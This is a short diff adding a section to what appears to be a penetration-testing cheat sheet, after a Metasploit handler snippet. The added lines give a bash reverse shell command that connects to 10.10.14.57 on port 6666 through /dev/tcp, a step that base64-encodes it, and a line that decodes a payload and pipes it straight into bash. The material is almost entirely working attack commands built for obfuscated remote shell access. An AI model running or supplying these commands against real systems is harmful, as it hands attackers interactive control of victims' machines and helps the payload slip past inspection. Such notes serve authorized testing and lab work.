@@ -53,3 +53,13 @@ set ExitOnSession false
 
 exploit -j
 ```
+
+# Base64 encoded reverse shell payload
+
+```sh
+echo -n 'bash -i >& /dev/tcp/10.10.14.57/6666 0>&1' | base64
+```
+
+```sh
+echo '<base64_encoded_payload>' | base64 -d | bash
+```
